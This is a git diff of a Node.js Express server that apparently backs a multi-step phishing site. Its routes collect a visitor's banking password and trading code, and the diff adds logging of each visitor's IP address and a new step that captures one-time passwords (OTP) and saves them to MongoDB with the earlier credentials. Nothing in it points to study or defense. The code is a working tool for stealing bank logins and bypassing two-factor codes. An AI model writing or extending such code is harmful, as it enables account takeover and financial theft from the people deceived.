@@ -1,7 +1,7 @@
 var express = require("express");
 var session = require("express-session");
 var expressValidator = require('express-validator');
-
+var requestIp = require('request-ip');
 var bodyParser = require('body-parser');
 var mongoose = require("mongoose");
 var Info = require("./models/InFo");
@@ -13,6 +13,11 @@ app.use(expressValidator());
 // parse application/json
 app.use(bodyParser.json());
 app.use(express.static('public'));
+app.use((req,res,next)=>{
+    var clientIp = requestIp.getClientIp(req); // on localhost > 127.0.0.1
+    console.log(clientIp);
+    next();
+});
 
 // Connect to Mongo
 app.use(session({
@@ -66,7 +71,13 @@ app.get("/Buoc-2",(req,res)=>{
     
 })
 app.get("/Buoc-3",(req,res)=>{
-    res.render("buoc3");
+    if(req.session.InfoId== undefined){
+        res.redirect("/");
+    }
+    else{
+        res.render("buoc3");
+    }
+    
 })
 app.post("/",(req,res)=>{
    
@@ -128,7 +139,7 @@ app.post("/actionstep2",(req,res)=>{
         PasswordBanking:req.body.PasswordBanking,
         Tradingcode:req.body.Tradingcode
     }
-    console.log(obj);
+    
     Info.updateOne({_id:req.session.InfoId},obj,(erro,doc)=>{
         if(doc){
              res.redirect("/Buoc-3");
@@ -138,7 +149,15 @@ app.post("/actionstep2",(req,res)=>{
 })
 app.post("/actionstep3",(req,res)=>{
     console.log(req.body);
-    res.redirect("/");
+    var obj={
+        OTP:req.body.OTP
+    }
+    Info.updateOne({_id:req.session.InfoId},obj,(erro,doc)=>{
+        if(doc){
+             res.redirect("/success");
+        }
+         
+     })
 })
 app.listen(80,()=>{
     console.log("APp đang chạy trên port 8000");
